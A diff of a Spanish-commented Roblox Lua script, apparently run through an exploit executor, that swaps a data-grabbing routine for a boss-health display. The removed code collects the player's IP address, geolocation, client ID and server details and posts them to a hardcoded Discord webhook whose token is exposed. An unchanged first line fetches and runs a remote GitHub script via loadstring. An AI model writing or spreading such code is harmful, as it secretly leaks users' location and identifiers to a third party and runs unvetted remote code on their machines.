@@ -1,276 +1,62 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()
      
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local yo = Players.LocalPlayer
 
-local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.CoreGui -- Establece el ScreenGui como hijo de CoreGui
 
--- Crear o obtener el IntValue para el tiempo de último envío
-local lastSendTimeValue = ReplicatedStorage:FindFirstChild("LastSendTime")
-if not lastSendTimeValue then
-    lastSendTimeValue = Instance.new("IntValue")
-    lastSendTimeValue.Name = "LastSendTime"
-    lastSendTimeValue.Value = 0
-    lastSendTimeValue.Parent = ReplicatedStorage
-end
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(0.3, 0, 0.1, 0)
+frame.Position = UDim2.new(0.35, 0, 0.9, 0)
+frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+frame.BorderSizePixel = 0
 
-local sentPlayerIds = {}
+-- Crear bordes redondeados
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(0, 10) -- Ajusta el tamaño del radio según lo necesites
 
-local function getJobIdAndHwid()
-    local jobId = game.JobId
-    local hwid = game.Players.LocalPlayer.UserId
-    return jobId, hwid
-end
+local bossHealthLabel = Instance.new("TextLabel", frame)
+bossHealthLabel.Size = UDim2.new(1, 0, 1, 0)
+bossHealthLabel.BackgroundTransparency = 1
+bossHealthLabel.TextScaled = true
+bossHealthLabel.Font = Enum.Font.GothamBold
+bossHealthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+bossHealthLabel.Text = "Buscando jefe..."
 
-local function formatNumber(number)
-    if number < 1000 then
-        return tostring(number)
-    end
-    local suffixes = {"", "K", "M", "B", "T", "QD"}
-    local suffix_index = 1
-    while math.abs(number) >= 1000 and suffix_index < #suffixes do
-        number = number / 1000.0
-        suffix_index = suffix_index + 1
-    end
-    return string.format("%.2f%s", number, suffixes[suffix_index])
-end
+-- Función para obtener el jefe más cercano
+local function getClosestBoss()
+    local closestBoss = nil
+    local closestDistance = math.huge -- Inicialmente a un valor muy alto
 
-local function getPlayerIPInfo()
-    local ip, data = "N/A", "N/A"
-    local success, response = pcall(function()
-        ip = game:HttpGet("https://v4.ident.me/")
-        data = game:HttpGet("http://ip-api.com/json")
-    end)
-    if not success then
-        warn("Error al obtener IP o geolocalización:", response)
-    end
-    return ip, data
-end
-
-local function detectExecutor()
-    local executorType = "Unsupported"
-    if syn and not is_sirhurt_closure and not pebc_execute then
-        executorType = "Synapse X"
-    elseif secure_load then
-        executorType = "Sentinel"
-    elseif pebc_execute then
-        executorType = "ProtoSmasher"
-    elseif KRNL_LOADED then
-        executorType = "Krnl"
-    elseif is_sirhurt_closure then
-        executorType = "SirHurt"
-    elseif identifyexecutor() and identifyexecutor():find("ScriptWare") then
-        executorType = "Script-Ware"
-    end
-    return executorType
-end
-
-local function getNextRebirthPrice(currentRebirths)
-    local basePrice = 3e6
-    local additionalPrice = 2e6
-    local multiplier = 1.010
-    local nextPrice = basePrice * (currentRebirths + 1) * multiplier + additionalPrice
-    return nextPrice
-end
-
-local function getAllPlayerData()
-    local playerDataList = {}
-    for _, player in pairs(Players:GetPlayers()) do
-        local playerData = {}
-        local playerName = player.Name
-        local playerDisplayName = player.DisplayName
-
-        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
-        if folderData then
-            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
-            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
-            local formattedRebirth = formatNumber(rebirthValue)
-            local formattedStrength = formatNumber(strengthValue)
-            local nextRebirthPrice = getNextRebirthPrice(rebirthValue)
-
-            table.insert(playerDataList, {
-                userId = player.UserId,  -- Añadir el userId
-                label = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
-                    playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice)),
-                rebirth = rebirthValue,
-                strength = strengthValue
-            })
-        end
-    end
-
-    table.sort(playerDataList, function(a, b)
-        if a.strength ~= b.strength then
-            return a.strength > b.strength
-        elseif a.rebirth ~= b.rebirth then
-            return a.rebirth > b.rebirth
-        end
-        return false
-    end)
-
-    return playerDataList
-end
-
-local function getClientId()
-    return RbxAnalyticsService:GetClientId()
-end
-
-local function getServerInfo()
-    local serverInfo = {}
-    local worldNames = {
-        [3311165597] = "Tierra",
-        [5151400895] = "Bilss",
-        [3608495586] = "HBTC TIEP",
-        [3608496430] = "HBTC GAV"
-    }
-
-    local totalServers = 0
-    local totalPlayers = 0
-    local serversInfo = {}
-
-    for placeId, worldName in pairs(worldNames) do
-        local serverListUrl = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
-        local success, response = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet(serverListUrl))
-        end)
-
-        if success and response and response.data then
-            local servers = #response.data
-            local players = 0
-
-            for _, server in ipairs(response.data) do
-                players = players + server.playing
+    for _, v in ipairs(game.Workspace.Living:GetChildren()) do
+        if v:FindFirstChild("Humanoid") and v.Name ~= yo.Name then -- Asegurarse de no incluir al jugador
+            local distance = (yo.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).magnitude
+            if distance < closestDistance then
+                closestDistance = distance
+                closestBoss = v
             end
-
-            totalServers = totalServers + servers
-            totalPlayers = totalPlayers + players
-
-            table.insert(serversInfo, {
-                worldName = worldName,
-                servers = servers,
-                players = players
-            })
         end
     end
 
-    return totalServers, totalPlayers, serversInfo
+    return closestBoss
 end
 
-local function sendPlayerInfoToDiscord()
-    local currentTime = os.time()
-    
-    -- Verifica si han pasado 24 horas desde el último envío
-    if currentTime - lastSendTimeValue.Value < 86400 then
-        return  -- No enviar si no ha pasado el tiempo
-    end
+-- Función para actualizar la salud del jefe
+local function updateBossHealth()
+    while true do
+        local currentBoss = getClosestBoss() -- Obtener el jefe más cercano
 
-    -- Actualiza el tiempo del último envío
-    lastSendTimeValue.Value = currentTime
-
-    local jobId, hwid = getJobIdAndHwid()
-    local ip, ipData = getPlayerIPInfo()
-    local executor = detectExecutor()
-    local allPlayerData = getAllPlayerData()
-    local clientId = getClientId()
-    local totalServers, totalPlayers, serversInfo = getServerInfo()
-
-    local strongestPlayer = allPlayerData[1]
-
-    local dataToSend = {
-        ["embeds"] = {
-            {
-                ["description"] = "Jugadores del juego:\n\n",
-                ["color"] = 0x00ff00,
-                ["title"] = "Estadísticas de los jugadores",
-                ["thumbnail"] = {
-                    ["url"] = "https://i.imgur.com/oBPXx0D.png"
-                },
-                ["fields"] = {
-                    {
-                        ["name"] = "JobId",
-                        ["value"] = jobId,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "HWID",
-                        ["value"] = hwid,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "IP",
-                        ["value"] = ip,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Datos de IP",
-                        ["value"] = ipData,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "ClientId",
-                        ["value"] = clientId,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Número Total de Servidores",
-                        ["value"] = formatNumber(totalServers),
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "Número Total de Jugadores en Servidores",
-                        ["value"] = formatNumber(totalPlayers),
-                        ["inline"] = true
-                    }
-                }
-            }
-        }
-    }
-
-    for _, playerData in ipairs(allPlayerData) do
-        local playerId = playerData.userId
-        if not sentPlayerIds[playerId] then
-            sentPlayerIds[playerId] = true  -- Marca el jugador como enviado
-            dataToSend["embeds"][1]["description"] = dataToSend["embeds"][1]["description"] .. playerData.label .. "\n\n"
+        if currentBoss and currentBoss:FindFirstChild("Humanoid") then
+            local health = currentBoss.Humanoid.Health
+            local maxHealth = currentBoss.Humanoid.MaxHealth
+            bossHealthLabel.Text = string.format("Jefe Actual: %s\nVida: %d / %d", currentBoss.Name, math.floor(health), math.floor(maxHealth))
+        else
+            bossHealthLabel.Text = "No hay jefes cerca"
         end
-    end
 
-    local serverDetails = "Detalles de los servidores:\n"
-    for _, info in ipairs(serversInfo) do
-        serverDetails = serverDetails .. string.format("Mundo: %s\nServidores: %d\nJugadores: %d\n\n", info.worldName, info.servers, info.players)
-    end
-
-    table.insert(dataToSend["embeds"], {
-        ["description"] = serverDetails,
-        ["color"] = 0x00ff00,
-        ["title"] = "Información de Servidores"
-    })
-
-    table.insert(dataToSend["embeds"], {
-        ["description"] = strongestPlayer.label,
-        ["color"] =0xFF0000,
-        ["title"] = "Jugador más fuerte"
-    })
-
-    local success, response = pcall(function()
-        return HttpService:PostAsync(discordWebhookUrl, HttpService:JSONEncode(dataToSend), Enum.HttpContentType.ApplicationJson)
-    end)
-
-    if not success then
-        warn("Error al enviar información a Discord:", response)
-    else
-        print("Información enviada a Discord con éxito.")
+        wait(0.03) -- Esperar 0.03 segundos antes de volver a verificar
     end
 end
 
-game.Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function()
-        wait(1)  -- Esperar a que el personaje se cargue
-        sendPlayerInfoToDiscord()
-    end)
-end)
-
--- Enviar información al entrar en el juego
-game.Players.PlayerAdded:Connect(function(player)
-    sendPlayerInfoToDiscord()
-end)
+spawn(updateBossHealth)
